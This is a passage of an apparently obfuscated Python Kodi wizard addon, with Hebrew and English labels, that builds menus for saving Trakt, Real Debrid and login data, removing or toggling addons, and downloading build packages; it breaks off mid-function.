	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO00O00OOO00OOO .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0O0O00OOOO00O00O .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O000OO00OOOOO0OOO .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O0OO00O00000O00 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOOO0O000O0OO00O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO000OO0000000O00 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת פליליסט לאודר:  '%OOO0OO0000OO0OOOO .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות באפר: '%O0OO00O0O00O000O0 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת רשימות ריפו:  '%OOO0000O0OOO0O000 .replace ('true',OOOO0OO0OO0O0OOO0 ).replace ('false',O000OO00O0OOO00O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	setView ('files','viewType')#line:3173
def traktMenu ():#line:3175
	OOO000000O0O0OO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3176
	O0OOOO0OOO00O00OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3177
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Save Trakt Data: %s'%OOO000000O0O0OO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0OOOO0OOO00O00OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	for OOO000000O0O0OO00 in traktit .ORDER :#line:3183
		O0O0O0OOO0O0OO0OO =TRAKTID [OOO000000O0O0OO00 ]['name']#line:3184
		O00O0OO0O0OO0000O =TRAKTID [OOO000000O0O0OO00 ]['path']#line:3185
		O00OO0000OO0OOOOO =TRAKTID [OOO000000O0O0OO00 ]['saved']#line:3186
		O00O0O00OOOOO00O0 =TRAKTID [OOO000000O0O0OO00 ]['file']#line:3187
		OOOOOOO0OO000OO00 =wiz .getS (O00OO0000OO0OOOOO )#line:3188
		OO0OOOOO00000O000 =traktit .traktUser (OOO000000O0O0OO00 )#line:3189
		OO00O000O00OOO0O0 =TRAKTID [OOO000000O0O0OO00 ]['icon']if os .path .exists (O00O0OO0O0OO0000O )else ICONTRAKT #line:3190
		O0OOO00O0000OO000 =TRAKTID [OOO000000O0O0OO00 ]['fanart']if os .path .exists (O00O0OO0O0OO0000O )else FANART #line:3191
		O00OO00O00000OOO0 =createMenu ('saveaddon','Trakt',OOO000000O0O0OO00 )#line:3192
		OOOOO00O0O0O0OO0O =createMenu ('save','Trakt',OOO000000O0O0OO00 )#line:3193
		O00OO00O00000OOO0 .append ((THEME2 %'%s Settings'%O0O0O0OOO0O0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO000000O0O0OO00 )))#line:3194
		addFile ('[+]-> %s'%O0O0O0OOO0O0OO0OO ,'',icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,themeit =THEME3 )#line:3196
		if not os .path .exists (O00O0OO0O0OO0000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =O00OO00O00000OOO0 )#line:3197
		elif not OO0OOOOO00000O000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO000000O0O0OO00 ,icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =O00OO00O00000OOO0 )#line:3198
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOOO00000O000 ,'authtrakt',OOO000000O0O0OO00 ,icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =O00OO00O00000OOO0 )#line:3199
		if OOOOOOO0OO000OO00 =="":#line:3200
			if os .path .exists (O00O0O00OOOOO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO000000O0O0OO00 ,icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =OOOOO00O0O0O0OO0O )#line:3201
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO000000O0O0OO00 ,icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =OOOOO00O0O0O0OO0O )#line:3202
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOOOO0OO000OO00 ,'',icon =OO00O000O00OOO0O0 ,fanart =O0OOO00O0000OO000 ,menu =OOOOO00O0O0O0OO0O )#line:3203
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3205
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	setView ('files','viewType')#line:3211
def realMenu ():#line:3213
	O0OO0OOOOOOO00OOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3214
	O00O0O00OO0O0O000 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3215
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Save Real Debrid Data: %s'%O0OO0OOOOOOO00OOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3217
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00O0O00OO0O0O000 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3218
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3219
	for O0000O00O0O0000OO in debridit .ORDER :#line:3221
		O0O00OO0OOO00O0O0 =DEBRIDID [O0000O00O0O0000OO ]['name']#line:3222
		O00O0OO00OOOO000O =DEBRIDID [O0000O00O0O0000OO ]['path']#line:3223
		OOOO00OO00O0OO0O0 =DEBRIDID [O0000O00O0O0000OO ]['saved']#line:3224
		OO00O0O0000OO00OO =DEBRIDID [O0000O00O0O0000OO ]['file']#line:3225
		O0OO0OOO0OOOOOO00 =wiz .getS (OOOO00OO00O0OO0O0 )#line:3226
		OO0000O0O000OO0O0 =debridit .debridUser (O0000O00O0O0000OO )#line:3227
		OO00OO000OOOOOO00 =DEBRIDID [O0000O00O0O0000OO ]['icon']if os .path .exists (O00O0OO00OOOO000O )else ICONREAL #line:3228
		OO0OO0OOO0OO0O00O =DEBRIDID [O0000O00O0O0000OO ]['fanart']if os .path .exists (O00O0OO00OOOO000O )else FANART #line:3229
		O0OO0OOOO0OOOOO0O =createMenu ('saveaddon','Debrid',O0000O00O0O0000OO )#line:3230
		OOO0O00OO00O00OOO =createMenu ('save','Debrid',O0000O00O0O0000OO )#line:3231
		O0OO0OOOO0OOOOO0O .append ((THEME2 %'%s Settings'%O0O00OO0OOO00O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0000O00O0O0000OO )))#line:3232
		addFile ('[+]-> %s'%O0O00OO0OOO00O0O0 ,'',icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,themeit =THEME3 )#line:3234
		if not os .path .exists (O00O0OO00OOOO000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =O0OO0OOOO0OOOOO0O )#line:3235
		elif not OO0000O0O000OO0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0000O00O0O0000OO ,icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =O0OO0OOOO0OOOOO0O )#line:3236
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0000O0O000OO0O0 ,'authdebrid',O0000O00O0O0000OO ,icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =O0OO0OOOO0OOOOO0O )#line:3237
		if O0OO0OOO0OOOOOO00 =="":#line:3238
			if os .path .exists (OO00O0O0000OO00OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0000O00O0O0000OO ,icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =OOO0O00OO00O00OOO )#line:3239
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0000O00O0O0000OO ,icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =OOO0O00OO00O00OOO )#line:3240
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO0OOO0OOOOOO00 ,'',icon =OO00OO000OOOOOO00 ,fanart =OO0OO0OOO0OO0O00O ,menu =OOO0O00OO00O00OOO )#line:3241
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3243
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	setView ('files','viewType')#line:3249
def loginMenu ():#line:3251
	OOO000OOOOO0OO0O0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3252
	OO00OO000O00OO0O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3253
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Save Login Data: %s'%OOO000OOOOO0OO0O0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO00OO000O00OO0O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	for OOO000OOOOO0OO0O0 in loginit .ORDER :#line:3259
		OOOOOOOOO0OO0O00O =LOGINID [OOO000OOOOO0OO0O0 ]['name']#line:3260
		O0OOO0OOOOO00O0OO =LOGINID [OOO000OOOOO0OO0O0 ]['path']#line:3261
		O000OOOO000OOO0OO =LOGINID [OOO000OOOOO0OO0O0 ]['saved']#line:3262
		O00O0OOOOOO00OO0O =LOGINID [OOO000OOOOO0OO0O0 ]['file']#line:3263
		OO0OO0000OO00OO00 =wiz .getS (O000OOOO000OOO0OO )#line:3264
		OO00OO00OOO0OOO00 =loginit .loginUser (OOO000OOOOO0OO0O0 )#line:3265
		O00OOO0OOOO0OOO00 =LOGINID [OOO000OOOOO0OO0O0 ]['icon']if os .path .exists (O0OOO0OOOOO00O0OO )else ICONLOGIN #line:3266
		O0O00O0O0OOOOO0OO =LOGINID [OOO000OOOOO0OO0O0 ]['fanart']if os .path .exists (O0OOO0OOOOO00O0OO )else FANART #line:3267
		O00O0OO0OO0OOOOO0 =createMenu ('saveaddon','Login',OOO000OOOOO0OO0O0 )#line:3268
		OO0O0O0OOO0000000 =createMenu ('save','Login',OOO000OOOOO0OO0O0 )#line:3269
		O00O0OO0OO0OOOOO0 .append ((THEME2 %'%s Settings'%OOOOOOOOO0OO0O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO000OOOOO0OO0O0 )))#line:3270
		addFile ('[+]-> %s'%OOOOOOOOO0OO0O00O ,'',icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,themeit =THEME3 )#line:3272
		if not os .path .exists (O0OOO0OOOOO00O0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =O00O0OO0OO0OOOOO0 )#line:3273
		elif not OO00OO00OOO0OOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO000OOOOO0OO0O0 ,icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =O00O0OO0OO0OOOOO0 )#line:3274
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OO00OOO0OOO00 ,'authlogin',OOO000OOOOO0OO0O0 ,icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =O00O0OO0OO0OOOOO0 )#line:3275
		if OO0OO0000OO00OO00 =="":#line:3276
			if os .path .exists (O00O0OOOOOO00OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO000OOOOO0OO0O0 ,icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =OO0O0O0OOO0000000 )#line:3277
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO000OOOOO0OO0O0 ,icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =OO0O0O0OOO0000000 )#line:3278
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OO0000OO00OO00 ,'',icon =O00OOO0OOOO0OOO00 ,fanart =O0O00O0O0OOOOO0OO ,menu =OO0O0O0OOO0000000 )#line:3279
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3281
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	setView ('files','viewType')#line:3287
def fixUpdate ():#line:3289
	if KODIV <17 :#line:3290
		O000000OOOOO0O00O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3291
		try :#line:3292
			os .remove (O000000OOOOO0O00O )#line:3293
		except Exception as OOO0O00O000O0000O :#line:3294
			wiz .log ("Unable to remove %s, Purging DB"%O000000OOOOO0O00O )#line:3295
			wiz .purgeDb (O000000OOOOO0O00O )#line:3296
	else :#line:3297
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3298
def removeAddonMenu ():#line:3300
	OO00OO00OOO000OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3301
	O0O0O0O00OO0OO00O =[];O0O000O0O00OO000O =[]#line:3302
	for OOOOOO0O00OO00O0O in sorted (OO00OO00OOO000OOO ,key =lambda OO0OOOO00O0O000O0 :OO0OOOO00O0O000O0 ):#line:3303
		O00OOOOO0O0O00000 =os .path .split (OOOOOO0O00OO00O0O [:-1 ])[1 ]#line:3304
		if O00OOOOO0O0O00000 in EXCLUDES :continue #line:3305
		elif O00OOOOO0O0O00000 in DEFAULTPLUGINS :continue #line:3306
		elif O00OOOOO0O0O00000 =='packages':continue #line:3307
		O000O0OOO0O0OOOOO =os .path .join (OOOOOO0O00OO00O0O ,'addon.xml')#line:3308
		if os .path .exists (O000O0OOO0O0OOOOO ):#line:3309
			OOO00OO00OOO0O0OO =open (O000O0OOO0O0OOOOO )#line:3310
			OO0O0O0OO0000O00O =OOO00OO00OOO0O0OO .read ()#line:3311
			OOO0OO0OO0OOO000O =wiz .parseDOM (OO0O0O0OO0000O00O ,'addon',ret ='id')#line:3312
			O000OO00OO00O00OO =O00OOOOO0O0O00000 if len (OOO0OO0OO0OOO000O )==0 else OOO0OO0OO0OOO000O [0 ]#line:3314
			try :#line:3315
				OOOO00OO0OOO00O00 =xbmcaddon .Addon (id =O000OO00OO00O00OO )#line:3316
				O0O0O0O00OO0OO00O .append (OOOO00OO0OOO00O00 .getAddonInfo ('name'))#line:3317
				O0O000O0O00OO000O .append (O000OO00OO00O00OO )#line:3318
			except :#line:3319
				pass #line:3320
	if len (O0O0O0O00OO0OO00O )==0 :#line:3321
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3322
		return #line:3323
	if KODIV >16 :#line:3324
		O0O0OOO00O000O0OO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O0O0O00OO0OO00O )#line:3325
	else :#line:3326
		O0O0OOO00O000O0OO =[];O00OOOO0000O0OO00 =0 #line:3327
		O00OOO0OOO00OOO00 =["-- Click here to Continue --"]+O0O0O0O00OO0OO00O #line:3328
		while not O00OOOO0000O0OO00 ==-1 :#line:3329
			O00OOOO0000O0OO00 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOO0OOO00OOO00 )#line:3330
			if O00OOOO0000O0OO00 ==-1 :break #line:3331
			elif O00OOOO0000O0OO00 ==0 :break #line:3332
			else :#line:3333
				OO0OO00OOO0OO00O0 =(O00OOOO0000O0OO00 -1 )#line:3334
				if OO0OO00OOO0OO00O0 in O0O0OOO00O000O0OO :#line:3335
					O0O0OOO00O000O0OO .remove (OO0OO00OOO0OO00O0 )#line:3336
					O00OOO0OOO00OOO00 [O00OOOO0000O0OO00 ]=O0O0O0O00OO0OO00O [OO0OO00OOO0OO00O0 ]#line:3337
				else :#line:3338
					O0O0OOO00O000O0OO .append (OO0OO00OOO0OO00O0 )#line:3339
					O00OOO0OOO00OOO00 [O00OOOO0000O0OO00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0O0O00OO0OO00O [OO0OO00OOO0OO00O0 ])#line:3340
	if O0O0OOO00O000O0OO ==None :return #line:3341
	if len (O0O0OOO00O000O0OO )>0 :#line:3342
		wiz .addonUpdates ('set')#line:3343
		for O0OO0O0O000000000 in O0O0OOO00O000O0OO :#line:3344
			removeAddon (O0O000O0O00OO000O [O0OO0O0O000000000 ],O0O0O0O00OO0OO00O [O0OO0O0O000000000 ],True )#line:3345
		xbmc .sleep (1000 )#line:3347
		if INSTALLMETHOD ==1 :O00OO0OOOOOOOO0O0 =1 #line:3349
		elif INSTALLMETHOD ==2 :O00OO0OOOOOOOO0O0 =0 #line:3350
		else :O00OO0OOOOOOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3351
		if O00OO0OOOOOOOO0O0 ==1 :wiz .reloadFix ('remove addon')#line:3352
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3353
def removeAddonDataMenu ():#line:3355
	if os .path .exists (ADDOND ):#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3357
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3360
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3361
		OOOO00OOOOO0O00OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3362
		for O00OOO0O000OOO0OO in sorted (OOOO00OOOOO0O00OO ,key =lambda O00OOO0OO00000OOO :O00OOO0OO00000OOO ):#line:3363
			O000OOOOOOO0O0O00 =O00OOO0O000OOO0OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3364
			OOO0000OOO000OO00 =os .path .join (O00OOO0O000OOO0OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3365
			OOOO00OOOOOOO0000 =os .path .join (O00OOO0O000OOO0OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3366
			O0OOO0000OO0000O0 =O000OOOOOOO0O0O00 #line:3367
			O000OO000O0O0OOOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3368
			for O000O0000O0O0OO00 in O000OO000O0O0OOOO :#line:3369
				O0OOO0000OO0000O0 =O0OOO0000OO0000O0 .replace (O000O0000O0O0OO00 ,O000OO000O0O0OOOO [O000O0000O0O0OO00 ])#line:3370
			if O000OOOOOOO0O0O00 in EXCLUDES :O0OOO0000OO0000O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OOO0000OO0000O0 #line:3371
			else :O0OOO0000OO0000O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OOO0000OO0000O0 #line:3372
			addFile (' %s'%O0OOO0000OO0000O0 ,'removedata',O000OOOOOOO0O0O00 ,icon =OOO0000OOO000OO00 ,fanart =OOOO00OOOOOOO0000 ,themeit =THEME2 )#line:3373
	else :#line:3374
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3375
	setView ('files','viewType')#line:3376
def enableAddons ():#line:3378
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3379
	OOOO00OO00O0OO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3380
	OO0OOO0OOO00O000O =0 #line:3381
	for O0O0OOOO0O0000O0O in sorted (OOOO00OO00O0OO000 ,key =lambda OO0O000O00O0OOO0O :OO0O000O00O0OOO0O ):#line:3382
		OOOOO000O0OOOO0O0 =os .path .split (O0O0OOOO0O0000O0O [:-1 ])[1 ]#line:3383
		if OOOOO000O0OOOO0O0 in EXCLUDES :continue #line:3384
		if OOOOO000O0OOOO0O0 in DEFAULTPLUGINS :continue #line:3385
		O0OOO0OOOOO000000 =os .path .join (O0O0OOOO0O0000O0O ,'addon.xml')#line:3386
		if os .path .exists (O0OOO0OOOOO000000 ):#line:3387
			OO0OOO0OOO00O000O +=1 #line:3388
			OOOO00OO00O0OO000 =O0O0OOOO0O0000O0O .replace (ADDONS ,'')[1 :-1 ]#line:3389
			O000O0OO000O00000 =open (O0OOO0OOOOO000000 )#line:3390
			OO0O0OO0O0OO0OO00 =O000O0OO000O00000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3391
			O0O00000O0O00OO00 =wiz .parseDOM (OO0O0OO0O0OO0OO00 ,'addon',ret ='id')#line:3392
			O0000OO0O000OOO0O =wiz .parseDOM (OO0O0OO0O0OO0OO00 ,'addon',ret ='name')#line:3393
			try :#line:3394
				O0OOO00O0OO0OOO00 =O0O00000O0O00OO00 [0 ]#line:3395
				OO0OO000O00O000OO =O0000OO0O000OOO0O [0 ]#line:3396
			except :#line:3397
				continue #line:3398
			try :#line:3399
				OOO00OO0O000O0O00 =xbmcaddon .Addon (id =O0OOO00O0OO0OOO00 )#line:3400
				O0000OO0OO00O00OO ="[COLOR green][Enabled][/COLOR]"#line:3401
				O00000O0OO00O0000 ="false"#line:3402
			except :#line:3403
				O0000OO0OO00O00OO ="[COLOR red][Disabled][/COLOR]"#line:3404
				O00000O0OO00O0000 ="true"#line:3405
				pass #line:3406
			O0OO00O00O00OO00O =os .path .join (O0O0OOOO0O0000O0O ,'icon.png')if os .path .exists (os .path .join (O0O0OOOO0O0000O0O ,'icon.png'))else ICON #line:3407
			OOOOOO0OOO0000OO0 =os .path .join (O0O0OOOO0O0000O0O ,'fanart.jpg')if os .path .exists (os .path .join (O0O0OOOO0O0000O0O ,'fanart.jpg'))else FANART #line:3408
			addFile ("%s %s"%(O0000OO0OO00O00OO ,OO0OO000O00O000OO ),'toggleaddon',OOOO00OO00O0OO000 ,O00000O0OO00O0000 ,icon =O0OO00O00O00OO00O ,fanart =OOOOOO0OOO0000OO0 )#line:3409
			O000O0OO000O00000 .close ()#line:3410
	if OO0OOO0OOO00O000O ==0 :#line:3411
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3412
	setView ('files','viewType')#line:3413
def changeFeq ():#line:3415
	OO000O0O0000OOO00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3416
	O000OOOO00O0OO00O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO000O0O0000OOO00 )#line:3417
	if not O000OOOO00O0OO00O ==-1 :#line:3418
		wiz .setS ('autocleanfeq',str (O000OOOO00O0OO00O ))#line:3419
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO000O0O0000OOO00 [O000OOOO00O0OO00O ]))#line:3420
def developer ():#line:3422
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3423
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3424
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3425
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3426
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3427
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3428
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3429
	setView ('files','viewType')#line:3431
def download (O0O0OO00O0OO00O00 ,OO000000OOOOO0000 ):#line:3436
  O0OO0000OOO0O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3437
  OOO0O00O0O00OOO00 =xbmcgui .DialogProgress ()#line:3438
  OOO0O00O0O00OOO00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3439
  O0OO00OO00O0OO0O0 =os .path .join (O0OO0000OOO0O0O00 ,'isr.zip')#line:3440
  O000O00OOOOO000OO =urllib2 .Request (O0O0OO00O0OO00O00 )#line:3441
  OO000OO0O0000O0OO =urllib2 .urlopen (O000O00OOOOO000OO )#line:3442
  OO0O0O0O0OOOO00OO =xbmcgui .DialogProgress ()#line:3444
  OO0O0O0O0OOOO00OO .create ("Downloading","Downloading "+name )#line:3445
  OO0O0O0O0OOOO00OO .update (0 )#line:3446
  OOOO0OO0000OO00O0 =OO000000OOOOO0000 #line:3447
  O0O00O00O00000000 =open (O0OO00OO00O0OO0O0 ,'wb')#line:3448
  try :#line:3450
    OOO0OO00OO0O0OOO0 =OO000OO0O0000O0OO .info ().getheader ('Content-Length').strip ()#line:3451
    OO0O0OO00O00OO000 =True #line:3452
  except AttributeError :#line:3453
